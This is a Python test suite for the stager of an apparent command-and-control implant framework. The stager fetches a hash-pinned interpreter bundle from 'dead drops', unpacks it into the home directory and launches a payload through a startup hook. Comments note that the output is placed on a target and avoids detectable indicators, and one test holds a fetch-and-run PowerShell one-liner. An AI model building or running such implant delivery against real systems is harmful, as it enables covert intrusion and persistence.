#!/usr/bin/env python3
"""Unit tests for the stager: the artifact that brings an interpreter.

**Which shell these tests actually run, stated so the coverage is not
misread.** `render_stager` emits two scripts and this file *executes*
only one of them. The posix template is rendered and run for real, under
`/bin/sh`, against a local HTTP server that serves a good bundle, a
truncated one and an HTML error page with a 200 on it. The PowerShell
template is checked here only as text -- that it renders, that it carries
the drops and the one-liner, that it names no secret -- because nothing
on this machine can run it. **Its fetch, its digest and its layout are
verified on the real Windows host in Task 15 and nowhere else**, so a
green run of this file is not evidence that the Windows path works.

Four things these tests are careful about.

**The host's own Python is taken away rather than assumed absent.** Every
run gets a `PATH` containing one directory of symlinks to the tools the
script needs -- `curl`, a digest tool, `unzip`, `mktemp` and a handful of
coreutils -- and no interpreter at all. That is what makes "finds none"
reproducible on a developer machine that has three Pythons on it. The
probe's two outcomes are then driven by what is put in that directory: a
wrapper around this very interpreter for "found", and a stub that fails
the version check for "below the floor".

**The bundle's interpreter leaves a trace when it runs.** `<base>/python3`
in the fixture is a shell script that writes its own path to a marker
file. So "nothing was executed" is an assertion about a file that would
exist, not about the absence of an observation -- and the control case,
the same bundle with its correct pin, must produce that marker, so the
probe is not blind.

**The fixture's members are mode 0644, as the real builder writes them.**
`tools/build_interpreter_bundle.py` fixes every entry's mode, so a
stager that unpacked and ran without making the interpreter executable
would fail on a real bundle. Here it fails on this one.

**"Nothing written" is asserted against two directories, not one.** The
layout's parent *and* the temporary directory the download goes through:
a stager that refused every drop but left an 11 MB file in `/tmp` has
still written.

No test writes outside a `TemporaryDirectory`, and no test reaches a
network beyond `127.0.0.1`.
"""

import base64
import hashlib
import io
import os
import shutil
import signal
import stat
import subprocess
import sys
import threading
import time
import unittest
import zipfile
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from tempfile import TemporaryDirectory

from software.c2 import server as server_mod
from software.c2.stagers.stager import MIN_PYTHON, render_stager
from software.c2.stagers.startup_hook import render_sitecustomize
from software.tests.test_tunnel_config import _AUTH, _GeneratorCase

# The generated names a build carries, of the shape the server mints.
_BASE_DIR = "support4f2a"
_PAYLOAD_NAME = "runtime9c21.py"

# What the fixture bundle's interpreter does when it is started: write its
# own path somewhere the test can read. Any execution at all shows up.
_INTERPRETER = "#!/bin/sh\nprintf '%s' \"$0\" > '{marker}'\nexit 0\n"

# The external programs the posix stager calls. Only these are put on the
# PATH a stager runs with -- notably no interpreter.
_SANDBOX_TOOLS = ("curl", "wget", "sha256sum", "shasum", "openssl", "unzip",
                  "tar", "mktemp", "mkdir", "rm", "mv", "chmod", "cut", "tr",
                  "sed", "setsid", "env", "cat")

# One of each group has to exist or the stager cannot work at all, and a
# test that ran without them would be testing the refusal path by
# accident. Skipped loudly instead.
_SANDBOX_REQUIRED = (("curl", "wget"), ("sha256sum", "shasum", "openssl"),
                     ("unzip", "tar"), ("mktemp",), ("mkdir",), ("rm",),
                     ("mv",), ("chmod",), ("cut",), ("tr",))


def _zip_bytes(members):
    """A zip of `{name: bytes}`, every member mode 0644 as the builder writes."""
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as out:
        for name in sorted(members):
            info = zipfile.ZipInfo(name, date_time=(1980, 1, 1, 0, 0, 0))
            info.compress_type = zipfile.ZIP_DEFLATED
            info.create_system = 3
            info.external_attr = 0o644 << 16
            out.writestr(info, members[name])
    return buffer.getvalue()


class _DropHandler(BaseHTTPRequestHandler):
    """Answers a fixed map of paths and records every one it was asked for."""

    protocol_version = "HTTP/1.0"

    def do_GET(self):
        self.server.requested.append(self.path)
        stalled = self.server.stalls.get(self.path)
        if stalled is not None:
            # Headers and a few bytes, then hold the connection open: a
            # fetch that is reliably still in progress when the test
            # signals the script.
            self.send_response(200)
            self.send_header("Content-Type", "application/octet-stream")
            self.send_header("Content-Length", str(len(stalled)))
            self.end_headers()
            self.wfile.write(stalled[:64])
            self.wfile.flush()
            self.server.released.wait(timeout=30)
            return
        answer = self.server.answers.get(self.path)
        if answer is None:
            self.send_error(404)
            return
        status, body, content_type = answer
        self.send_response(status)
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *args):
        pass


class _StagerCase(unittest.TestCase):
    """A sandboxed PATH, a temporary HOME and a local dead drop."""

    def setUp(self):
        if sys.platform.startswith("win"):
            self.skipTest("the posix template needs a posix shell")

        self._tmp = TemporaryDirectory()
        self.addCleanup(self._tmp.cleanup)
        self.root = Path(self._tmp.name)

        self.home = self.root / "home"
        self.scratch = self.root / "scratch"
        self.bin = self.root / "bin"
        for directory in (self.home, self.scratch, self.bin):
            directory.mkdir()
        self.marker = self.root / "interpreter-ran"
        self.oneliner_marker = self.root / "oneliner-ran"

        self._fill_sandbox()
        self._start_drop_server()

    # ── the sandbox ──

    def _fill_sandbox(self):
        for group in _SANDBOX_REQUIRED:
            if not any(shutil.which(tool) for tool in group):
                self.skipTest("none of %s is on this machine, so the stager "
                              "could not fetch or verify anything"
                              % (", ".join(group),))
        for tool in _SANDBOX_TOOLS:
            found = shutil.which(tool)
            if found:
                os.symlink(found, str(self.bin / tool))
        self.assertIsNone(shutil.which("python3", path=str(self.bin)),
                          "the sandbox PATH carries an interpreter, so "
                          "\"finds none\" would not be what is tested")

    def _write_tool(self, name, body):
        path = self.bin / name
        path.write_text(body, encoding="utf-8")
        path.chmod(0o755)
        return path

    def give_a_usable_python(self):
        """Put a wrapper around this interpreter on the sandbox PATH."""
        self._write_tool("python3", '#!/bin/sh\nexec "%s" "$@"\n'
                         % (sys.executable,))

    def give_an_old_python(self):
        """An interpreter that fails the version check, as an old one would."""
        self._write_tool("python3",
                         "#!/bin/sh\n"
                         "case \"${1-}\" in\n"
                         "  -V|--version) echo 'Python 3.4.3'; exit 0 ;;\n"
                         "esac\n"
                         "exit 1\n")

    # ── the dead drop ──

    def _start_drop_server(self):
        self.server = ThreadingHTTPServer(("127.0.0.1", 0), _DropHandler)
        self.server.answers = {}
        self.server.stalls = {}
        self.server.requested = []
        self.server.released = threading.Event()
        thread = threading.Thread(target=self.server.serve_forever,
                                  kwargs={"poll_interval": 0.05}, daemon=True)
        thread.start()

        def stop():
            self.server.released.set()
            self.server.shutdown()
            self.server.server_close()
            thread.join(timeout=5)

        self.addCleanup(stop)
        self.drop_host = "127.0.0.1:%d" % (self.server.server_address[1],)

    def serve(self, path, body, status=200,
              content_type="application/octet-stream"):
        """Answer `path` with `body`; return its URL."""
        self.server.answers[path] = (status, body, content_type)
        return "http://%s%s" % (self.drop_host, path)

    def serve_and_stall(self, path, body):
        """Answer `path` with a few bytes and then never finish."""
        self.server.stalls[path] = body
        return "http://%s%s" % (self.drop_host, path)

    @property
    def requested(self):
        return list(self.server.requested)

    # ── the bundle ──

    def bundle(self, base_dir=_BASE_DIR):
        """A bundle laid out as the builder lays one out, in `base_dir`."""
        return _zip_bytes({
            "%s/python3" % (base_dir,):
                _INTERPRETER.format(marker=self.marker).encode("utf-8"),
            "%s/Lib/sitecustomize.py" % (base_dir,):
                render_sitecustomize(_PAYLOAD_NAME).encode("utf-8"),
            "%s/%s" % (base_dir, _PAYLOAD_NAME):
                b"# the delivered artifact\n",
        })

    def drop(self, url, sha256):
        return {"url": url, "sha256": sha256}

    def good_drop(self, path="/bundle.zip"):
        """A drop that serves a good bundle under its own correct pin."""
        body = self.bundle()
        url = self.serve(path, body)
        return self.drop(url, hashlib.sha256(body).hexdigest())

    # ── running one ──

    def oneliner(self):
        """A one-liner of the shape the generator emits, with a trace."""
        return ("python3 -c 'open(\"%s\",\"w\").write(\"one-liner\")'"
                % (self.oneliner_marker,))

    def stager_script(self, drops, oneliner=None, base_dir=_BASE_DIR):
        """The rendered posix stager, on disk and ready to run."""
        text = render_stager("posix", oneliner=oneliner or self.oneliner(),
                             drops=drops, base_dir=base_dir)
        script = self.root / "stage.sh"
        script.write_text(text, encoding="utf-8")
        return script

    def stager_env(self):
        """A sandboxed environment: no interpreter, and nothing shared."""
        return {"PATH": str(self.bin), "HOME": str(self.home),
                "TMPDIR": str(self.scratch), "LC_ALL": "C"}

    def run_stager(self, drops, oneliner=None, base_dir=_BASE_DIR,
                   timeout=120):
        return subprocess.run(
            ["/bin/sh", str(self.stager_script(drops, oneliner, base_dir))],
            env=self.stager_env(), stdin=subprocess.DEVNULL,
            capture_output=True, text=True, timeout=timeout)

    # ── what to look for afterwards ──

    def laid_out(self, base_dir=_BASE_DIR):
        return self.home / base_dir

    def await_marker(self, timeout=20.0):
        """The interpreter is started detached, so give it a moment."""
        deadline = time.time() + timeout
        while time.time() < deadline:
            if self.marker.exists():
                return self.marker.read_text(encoding="utf-8")
            time.sleep(0.05)
        return None

    def assertNoLayout(self, base_dir=_BASE_DIR):
        """No layout, no staging directory, no download, nothing started."""
        self.assertEqual(
            sorted(p.name for p in self.home.iterdir()
                   if base_dir in p.name), [],
            "the layout or a staging directory beside it exists")
        self.assertEqual(sorted(p.name for p in self.scratch.iterdir()), [],
                         "the download's temporary directory was left behind")
        self.assertFalse(self.marker.exists(),
                         "the bundle's interpreter ran")

    def assertNothingWritten(self):
        """The stronger form: the parent is untouched, not merely layout-free.

        Used where no interpreter runs at all. The one-liner path cannot
        assert this, because a real interpreter creates things in `$HOME`
        of its own accord and those are not the stager's writes.
        """
        self.assertEqual(sorted(p.name for p in self.home.iterdir()), [],
                         "the layout's parent is not empty")
        self.assertNoLayout()


class TestTheProbeComesFirst(_StagerCase):
    """What the stager does before it considers fetching anything."""

    def test_rendered_stager_runs_the_oneliner_when_a_python_is_found(self):
        self.give_a_usable_python()
        good = self.good_drop()

        result = self.run_stager([good])

        self.assertEqual(result.returncode, 0, result.stderr[-400:])
        self.assertEqual(self.oneliner_marker.read_text(encoding="utf-8"),
                         "one-liner")
        self.assertEqual(self.requested, [],
                         "a host with a usable interpreter still spoke to "
                         "the dead drop")
        self.assertNoLayout()

    def test_an_interpreter_below_the_floor_is_not_usable(self):
        self.give_an_old_python()
        good = self.good_drop()

        result = self.run_stager([good])

        self.assertEqual(result.returncode, 0, result.stderr[-400:])
        self.assertFalse(self.oneliner_marker.exists(),
                         "the one-liner ran on an interpreter below the floor")
        self.assertEqual(self.requested, ["/bundle.zip"])
        self.assertIsNotNone(self.await_marker())

    def test_an_empty_drop_list_renders_a_stager_that_only_probes(self):
        self.good_drop()  # answering, and it must never be asked
        text = render_stager("posix", oneliner=self.oneliner(), drops=[],
                             base_dir=_BASE_DIR)
        self.assertNotIn("http://", text)
        self.assertNotIn(self.drop_host, text)

        result = self.run_stager([])

        self.assertNotEqual(result.returncode, 0)
        self.assertEqual(self.requested, [],
                         "a stager with no drops reached for one anyway")
        self.assertFalse(self.oneliner_marker.exists())
        self.assertNothingWritten()


class TestWalkingTheDrops(_StagerCase):
    """The ordered list, and what a verified bundle becomes on disk."""

    def test_rendered_stager_walks_the_drops_in_order(self):
        missing = self.drop("http://%s/gone.zip" % (self.drop_host,),
                            hashlib.sha256(b"never served").hexdigest())
        wrong = self.drop(self.serve("/portal.zip", b"<html>sign in</html>",
                                     content_type="text/html"),
                          hashlib.sha256(self.bundle()).hexdigest())
        good = self.good_drop("/third.zip")

        result = self.run_stager([missing, wrong, good])

        self.assertEqual(result.returncode, 0, result.stderr[-400:])
        self.assertEqual(self.requested,
                         ["/gone.zip", "/portal.zip", "/third.zip"])
        self.assertTrue(self.laid_out().is_dir())

    def test_the_verified_bundle_is_laid_out_in_the_parent_of_the_base(self):
        # The bundle's one top-level directory *is* `base_dir`, so the
        # extraction goes into the parent: a stager that unpacked into
        # `<base>` would produce `<base>/<base>/python3` and the startup
        # hook would look one directory too high for the payload.
        result = self.run_stager([self.good_drop()])

        self.assertEqual(result.returncode, 0, result.stderr[-400:])
        base = self.laid_out()
        self.assertTrue((base / "python3").is_file())
        self.assertTrue((base / "Lib" / "sitecustomize.py").is_file())
        self.assertTrue((base / _PAYLOAD_NAME).is_file())
        self.assertFalse((base / _BASE_DIR).exists(),
                         "the bundle was unpacked into <base> rather than "
                         "into its parent")
        self.assertEqual(sorted(p.name for p in self.home.iterdir()),
                         [_BASE_DIR],
                         "the layout's parent holds something else as well")

    def test_the_laid_out_interpreter_is_made_executable_and_started(self):
        result = self.run_stager([self.good_drop()])

        self.assertEqual(result.returncode, 0, result.stderr[-400:])
        interpreter = self.laid_out() / "python3"
        mode = stat.S_IMODE(interpreter.stat().st_mode)
        self.assertTrue(mode & stat.S_IXUSR,
                        "a bundle's members are mode 0644, so an interpreter "
                        "nobody chmodded cannot start: %o" % (mode,))
        self.assertEqual(self.await_marker(), str(interpreter))
        self.assertEqual(sorted(p.name for p in self.scratch.iterdir()), [],
                         "the download's temporary directory was left behind")


class TestADeadDropThatAnswersWithTheWrongBytes(_StagerCase):
    """Review Focus: the drop is attacker-controlled and the pin is all.

    Each of these serves something that a stager which trusted the
    transport would accept: a short read, a captive portal's login page
    with a 200 on it, a file whose bytes are simply not the ones pinned.
    """

    def test_a_truncated_bundle_is_refused_on_the_hash(self):
        body = self.bundle()
        url = self.serve("/short.zip", body[:len(body) // 3])
        drops = [self.drop(url, hashlib.sha256(body).hexdigest())]

        result = self.run_stager(drops)

        self.assertNotEqual(result.returncode, 0)
        self.assertIn("digest", result.stderr.lower(),
                      "the refusal was silent: %r" % (result.stderr[-200:],))
        self.assertNothingWritten()

    def test_an_html_error_page_served_as_200_is_refused_on_the_hash(self):
        page = (b"<!DOCTYPE html><html><head><title>Not Found</title></head>"
                b"<body>The object you requested is gone.</body></html>")
        url = self.serve("/gone.zip", page, status=200,
                         content_type="text/html")
        drops = [self.drop(url, hashlib.sha256(self.bundle()).hexdigest())]

        result = self.run_stager(drops)

        self.assertNotEqual(result.returncode, 0)
        self.assertEqual(self.requested, ["/gone.zip"])
        self.assertIn("digest", result.stderr.lower())
        self.assertNothingWritten()

    def test_the_next_drop_is_tried_after_a_hash_failure(self):
        first = self.drop(self.serve("/first.zip", b"PK\x03\x04 not ours"),
                          hashlib.sha256(self.bundle()).hexdigest())
        second = self.good_drop("/second.zip")

        result = self.run_stager([first, second])

        self.assertEqual(result.returncode, 0, result.stderr[-400:])
        self.assertEqual(self.requested, ["/first.zip", "/second.zip"])
        self.assertTrue(self.laid_out().is_dir())
        self.assertIsNotNone(self.await_marker())

    def test_every_drop_failing_leaves_nothing_written_and_exits_non_zero(self):
        body = self.bundle()
        pin = hashlib.sha256(body).hexdigest()
        drops = [
            self.drop("http://%s/absent.zip" % (self.drop_host,), pin),
            self.drop(self.serve("/truncated.zip", body[:40]), pin),
            self.drop(self.serve("/portal.zip", b"<html>login</html>",
                                 content_type="text/html"), pin),
            self.drop("http://127.0.0.1:1/unreachable.zip", pin),
        ]

        result = self.run_stager(drops)

        self.assertNotEqual(result.returncode, 0)
        self.assertEqual(self.requested,
                         ["/absent.zip", "/truncated.zip", "/portal.zip"])
        self.assertFalse(self.oneliner_marker.exists())
        self.assertNothingWritten()

    def test_nothing_is_executed_before_the_hash_matches(self):
        # The bundle served here is a *good* one -- it would run if it
        # were unpacked -- offered under a pin that does not match it. So
        # the marker's absence is about a file that would exist, and the
        # control below requires the same fixture to produce it.
        body = self.bundle()
        url = self.serve("/swapped.zip", body)
        wrong_pin = hashlib.sha256(body + b"!").hexdigest()

        result = self.run_stager([self.drop(url, wrong_pin)])

        self.assertNotEqual(result.returncode, 0)
        self.assertIsNone(self.await_marker(timeout=2.0),
                          "the bundle's interpreter ran although its pin "
                          "did not match")
        self.assertNothingWritten()

        # The control: same bytes, correct pin. Without this, the probe
        # above could be passing because the fixture never runs at all.
        result = self.run_stager(
            [self.drop(url, hashlib.sha256(body).hexdigest())])

        self.assertEqual(result.returncode, 0, result.stderr[-400:])
        self.assertIsNotNone(self.await_marker(),
                             "the fixture's interpreter never runs, so the "
                             "assertion above tested nothing")


class TestAnInterruptedRun(_StagerCase):
    """What a Ctrl-C during a fetch leaves behind.

    An 11 MB download in an operator's hands is the realistic place for
    one. A handler installed on `INT` that merely cleans up and returns
    resumes the script *after the interrupted command* with its path
    variables emptied, and the next loop iteration then writes relative
    to the filesystem root.
    """

    def test_an_interrupt_during_a_fetch_stops_rather_than_resuming(self):
        body = self.bundle()
        stalling = self.drop(self.serve_and_stall("/slow.zip", body),
                             hashlib.sha256(body).hexdigest())
        following = self.good_drop("/second.zip")

        script = self.stager_script([stalling, following])
        process = subprocess.Popen(
            ["/bin/sh", str(script)], env=self.stager_env(),
            stdin=subprocess.DEVNULL, stdout=subprocess.PIPE,
            stderr=subprocess.PIPE, text=True, start_new_session=True)
        try:
            deadline = time.time() + 30
            while time.time() < deadline and "/slow.zip" not in self.requested:
                time.sleep(0.02)
            self.assertIn("/slow.zip", self.requested,
                          "the stalling drop was never fetched, so nothing "
                          "was interrupted")
            # The fetch cannot complete while the handler holds the
            # connection, so the signal lands mid-transfer. The group, not
            # the pid: the shell is waiting on its fetch child.
            os.killpg(os.getpgid(process.pid), signal.SIGINT)
            process.communicate(timeout=60)
        finally:
            self.server.released.set()
            if process.poll() is None:
                process.kill()
                process.communicate()

        self.assertNotEqual(process.returncode, 0)
        self.assertEqual(self.requested, ["/slow.zip"],
                         "the script resumed after the interrupt and walked "
                         "on to the next drop")
        self.assertNothingWritten()


class TestWhatTheRenderedTextCarries(unittest.TestCase):
    """Both templates as text, including the one nothing here can run."""

    def setUp(self):
        self.drops = [
            {"url": "https://example.invalid/a.zip", "sha256": "a" * 64},
            {"url": "https://example.invalid/b.zip", "sha256": "b" * 64},
        ]

    def render(self, platform, **overrides):
        asked = {"oneliner": "python3 -c 'print(1)'", "drops": self.drops,
                 "base_dir": _BASE_DIR}
        asked.update(overrides)
        return render_stager(platform, **asked)

    def test_both_templates_render_with_every_placeholder_filled(self):
        for platform in ("posix", "windows"):
            with self.subTest(platform=platform):
                text = self.render(platform)
                self.assertNotIn("@@", text,
                                 "a placeholder was left unfilled")
                for drop in self.drops:
                    self.assertIn(drop["url"], text)
                    self.assertIn(drop["sha256"], text)
                self.assertIn(_BASE_DIR, text)

    def test_the_posix_template_is_a_shell_script_and_the_other_is_not(self):
        self.assertTrue(self.render("posix").startswith("#!/bin/sh"))
        windows = self.render("windows")
        self.assertFalse(windows.startswith("#!"))
        self.assertIn("$LASTEXITCODE", windows)

    def test_the_version_floor_the_config_states_is_the_one_checked(self):
        major, minor = MIN_PYTHON
        for platform in ("posix", "windows"):
            with self.subTest(platform=platform):
                text = self.render(platform)
                self.assertIn("sys.version_info[:2] >= (%d, %d)"
                              % (major, minor), text)

    def test_a_one_liner_with_a_quote_in_it_survives_both_templates(self):
        # The gist route's Windows one-liner carries single quotes, and a
        # template that pasted it raw would end its own string early.
        oneliner = "powershell -c \"irm 'http://h/x'|python\""
        self.assertIn(oneliner, self.render("windows", oneliner=oneliner)
                      .replace("''", "'"))
        self.assertIn(oneliner, self.render("posix", oneliner=oneliner)
                      .replace("'\\''", "'"))

    def test_an_unpinned_or_malformed_drop_is_refused_at_render_time(self):
        for bad in ({"url": "https://example.invalid/a.zip"},
                    {"url": "https://example.invalid/a.zip", "sha256": ""},
                    {"url": "https://example.invalid/a.zip",
                     "sha256": "z" * 64},
                    {"url": "https://example.invalid/a.zip",
                     "sha256": "a" * 63},
                    {"url": "", "sha256": "a" * 64},
                    {"url": "ftp://example.invalid/a.zip", "sha256": "a" * 64},
                    {"url": "https://example.invalid/a b.zip",
                     "sha256": "a" * 64},
                    {"url": "https://example.invalid/a'.zip",
                     "sha256": "a" * 64},
                    "https://example.invalid/a.zip"):
            with self.subTest(bad=bad):
                for platform in ("posix", "windows"):
                    with self.assertRaises(ValueError):
                        self.render(platform, drops=[bad])

    def test_an_unknown_platform_and_an_unusable_base_dir_are_refused(self):
        with self.assertRaises(ValueError):
            self.render("plan9")
        for bad in ("", ".hidden", "a/b", "a b", "a'b", "..", None):
            with self.subTest(base_dir=bad):
                with self.assertRaises(ValueError):
                    self.render("posix", base_dir=bad)

    def test_neither_template_names_a_payload_of_the_write_ups_kind(self):
        # The same gate `test_tunnel_persistence` holds over this package,
        # asserted here too: the extension would be an indicator of this
        # project's own making, and these two files are rendered onto a
        # target verbatim.
        for platform in ("posix", "windows"):
            with self.subTest(platform=platform):
                self.assertNotIn(".dll", self.render(platform).lower())

    def test_the_windows_probe_redirects_no_standard_error(self):
        """A regression guard for a trap no shell here can reproduce.

        In Windows PowerShell 5.1 any `2>` on a native command turns its
        stderr into `NativeCommandError` records that `'Stop'` throws on,
        so the probe would read a warning-printing interpreter as one
        below the floor. Nothing on this machine can run that, which is
        why the shape is pinned here as well as explained in the
        template: a later tidy-up that adds `2>$null` back fails this.
        """
        probe = [line for line in self.render("windows").splitlines()
                 if "sys.version_info" in line]
        self.assertEqual(len(probe), 1,
                         "expected exactly one probe line: %r" % (probe,))
        self.assertIn("1>$null", probe[0])
        self.assertNotIn("2>", probe[0])

    def test_both_templates_parse_in_their_own_shell(self):
        """A syntax check, which is *not* a run of either stager.

        `sh -n` and PowerShell's own parser say the rendered text is
        well-formed; neither says it behaves. The posix behaviour is in
        the classes above; the Windows behaviour is Task 15's, on a real
        host. This test exists because a template with a typo in a branch
        no local test reaches would otherwise be found there and not here.
        """
        with TemporaryDirectory() as directory:
            for drops in (self.drops, []):
                script = Path(directory, "s.sh")
                script.write_text(self.render("posix", drops=drops),
                                  encoding="utf-8")
                checked = subprocess.run(["/bin/sh", "-n", str(script)],
                                         capture_output=True, text=True)
                self.assertEqual(checked.returncode, 0, checked.stderr)

                shell = shutil.which("pwsh") or shutil.which("powershell")
                if not shell:
                    continue
                script = Path(directory, "s.ps1")
                script.write_text(self.render("windows", drops=drops),
                                  encoding="utf-8")
                checked = subprocess.run(
                    [shell, "-NoProfile", "-Command",
                     "$e = $null; "
                     "[System.Management.Automation.Language.Parser]"
                     "::ParseFile('%s', [ref]$null, [ref]$e) | Out-Null; "
                     "if ($e) { $e | %%{ $_.ToString() }; exit 1 }"
                     % (script,)],
                    capture_output=True, text=True)
                self.assertEqual(checked.returncode, 0,
                                 checked.stdout + checked.stderr)


class _StagerGeneratorCase(_GeneratorCase):
    """Both generator routes, asked for a build with a drop list."""

    drops = [{"url": "https://drop.example.invalid/one.zip",
              "sha256": "1" * 64},
             {"url": "https://drop.example.invalid/two.zip",
              "sha256": "2" * 64}]

    def request_body(self, tunnel=None):
        body = super().request_body(tunnel)
        if self.drops is not None:
            body["drops"] = self.drops
        return body


class TestTheGeneratorEmitsStagers(_StagerGeneratorCase):
    """The second artifact shape, from both routes."""

    def test_generator_emits_both_stagers(self):
        for route in ("gen", "gist"):
            with self.subTest(route=route):
                body, gen_cfg = self.generate(route)
                base_dir = gen_cfg["persistence"]["base_dir"]
                for key, head in (("stager_nix", "#!/bin/sh"),
                                  ("stager_win", "$ErrorActionPreference")):
                    text = body.get(key)
                    self.assertIsInstance(text, str,
                                          "the %s route emitted no %s"
                                          % (route, key))
                    self.assertIn(head, text)
                    self.assertNotIn("@@", text)
                    self.assertIn(base_dir, text,
                                  "the stager names a different layout from "
                                  "the one the build carries")
                    for drop in self.drops:
                        self.assertIn(drop["url"], text)
                        self.assertIn(drop["sha256"], text)

                # The one-liner is carried quoted for its shell, so it is
                # compared unescaped rather than raw.
                self.assertIn(body["oneliner_unix"],
                              body["stager_nix"].replace("'\\''", "'"))
                self.assertIn(body["oneliner_win"],
                              body["stager_win"].replace("''", "'"))

    def test_rendered_stager_contains_no_psk_and_no_private_key(self):
        for route in ("gen", "gist"):
            with self.subTest(route=route):
                body, gen_cfg = self.generate(route, self.asked_for())
                psk = gen_cfg["tunnel"]["psk"]
                self.assertTrue(psk, "this build carries no tunnel")
                private = self.store().static_private()
                self.assertTrue(private)

                for key in ("stager_nix", "stager_win"):
                    text = body[key]
                    self.assertNotIn(psk, text, "%s carries the PSK" % key)
                    self.assertNotIn(
                        base64.b64encode(private).decode("ascii"), text,
                        "%s carries the server's static private key" % key)
                    self.assertNotIn(private.hex(), text)


class TestAStagerTheGeneratorRefuses(_StagerGeneratorCase):
    """A drop list that cannot be verified is a refusal, not a build."""

    drops = [{"url": "https://drop.example.invalid/one.zip", "sha256": ""}]

    def test_a_malformed_pin_is_refused_before_a_credential_is_registered(self):
        response = self.client.post("/api/server/beacon-gen",
                                    json=self.request_body(self.asked_for()),
                                    headers=_AUTH)

        self.assertEqual(response.status_code, 400, response.data[:300])
        self.assertIn("sha256", response.get_json().get("error", "").lower())
        store_path = server_mod._tunnel_keystore_path(self.data_dir)
        if store_path.exists():
            self.assertEqual(self.store().builds(), [],
                             "a build with an unverifiable drop list left a "
                             "PSK in the store that no artifact holds")


if __name__ == "__main__":
    unittest.main()
